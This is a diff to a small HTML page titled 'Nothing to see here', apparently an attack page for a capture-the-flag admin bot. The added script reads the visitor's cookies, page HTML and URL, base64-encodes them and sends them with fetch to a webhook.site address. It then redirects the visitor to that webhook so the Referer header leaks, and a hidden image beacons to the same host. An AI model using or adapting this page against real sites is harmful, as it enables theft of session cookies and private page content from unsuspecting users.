@@ -1,6 +1,38 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Nothing to see here</title>
+</head>
 <body>
-  <img src="https://webhook.site/ed2ef1cd-e216-4528-a098-9168b8fe5b00/hello">
+    <h1>Processing...</h1>
+    
+    <script>
+        // 1. Define your webhook
+        const webhook = "https://webhook.site/ed2ef1cd-e216-4528-a098-9168b8fe5b00";
+
+        // 2. Function to send data
+        function sendLeak(label, data) {
+            fetch(`${webhook}?${label}=${btoa(data)}`, {mode: 'no-cors'});
+        }
+
+        // 3. Try to steal Cookies
+        if (document.cookie) {
+            sendLeak("cookies", document.cookie);
+        }
+
+        // 4. Try to steal the Page Content (where the flag usually hides)
+        sendLeak("html", document.body.innerHTML);
+
+        // 5. Try to steal the URL (may contain a flag in the query string)
+        sendLeak("location", window.location.href);
+
+        // 6. Automatic Redirect (The "Referer" Trick)
+        // This forces the bot to your webhook. Check the "Referer" header in Webhook.site!
+        setTimeout(() => {
+            window.location.href = webhook + "?type=redirect";
+        }, 1000);
+    </script>
+
+    <img src="https://webhook.site/ed2ef1cd-e216-4528-a098-9168b8fe5b00/fallback-img" style="display:none;">
 </body>
 </html>
